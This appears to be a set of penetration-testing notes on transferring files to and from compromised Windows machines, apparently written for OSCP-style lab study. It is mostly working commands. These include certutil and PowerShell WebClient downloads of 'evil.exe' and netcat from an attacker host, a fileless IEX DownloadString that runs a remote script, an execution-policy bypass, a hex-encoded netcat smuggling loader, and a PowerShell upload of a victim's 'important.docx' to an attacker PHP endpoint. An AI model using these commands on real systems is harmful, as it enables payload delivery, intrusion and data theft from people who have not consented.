# Windows File Transfers

* FTP on attacker machine
- Can also use tftp for file transfers  


### Easiest file transfer methods
**Attacker -> Victim machine**
1. On attacking Machine: `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
	On Windows victim Machine: `copy \\192.168.49.80\kali\winPEAS.bat .`

2. certutil -urlcache -f  `<url>` `<executable>`
```
CMD='cmd.exe /c certutil.exe -f -urlcache -split http://192.168.119.167:80/nc.exe c:\Users\Administrator\Desktop\nc.exe'
```

3. Letâ€™s download this file to our Kali box using SCP. Start a SSH server if it is not already running

```
systemctl start ssh.socket 
```
To transfer a local file from your current machine to a remote host, you would run the following command
```
scp localfile user@192.168.178.27:remotefile
```

### Another Method
```
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1 C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1 C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1 C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
```


Run the above using `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro file -File wget.ps1`  
Powershell default exec policy is restriction, no logo to not seee logo and nopro for prevention of loading default profile

Can do the same in one line without creating a file:   
`c> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http:/ /10.11.0.4/evil.exe', 'newexploit.exe')`


Can also execute a file without saving it to disk:
`powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(' http://10.11.0.4/helloworld.ps1')`


### Windows Downloads with exe2hex and PowerShell
**Attacker - Victim machine**
Compress a binary, then convert to a hex string, embed to a windows script
Can use UPX: PE compression tool

On attacker machine: `upx -9 nc.exe`
`exe2hex -x nc.exe -p nc.cmd`
Transfer the nc file and on the windows host, run `powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$ h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte ]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1}; set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"`
command above can be found in the nc.cmd 


### Windows uploads using scripting languages
**Victim - Attacker machine**
On attacker kali machine, start an apache server and create an uploads directory. Change owner to www-data
```
<?php	
$uploaddir	=	'/var/www/uploads/';
$uploadfile	=	$uploaddir	.	$_FILES['file']['name'];	
move_uploaded_file($_FILES['file']['tmp_name'],	$uploadfile)	?>	
```

From windows machine: `powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')`

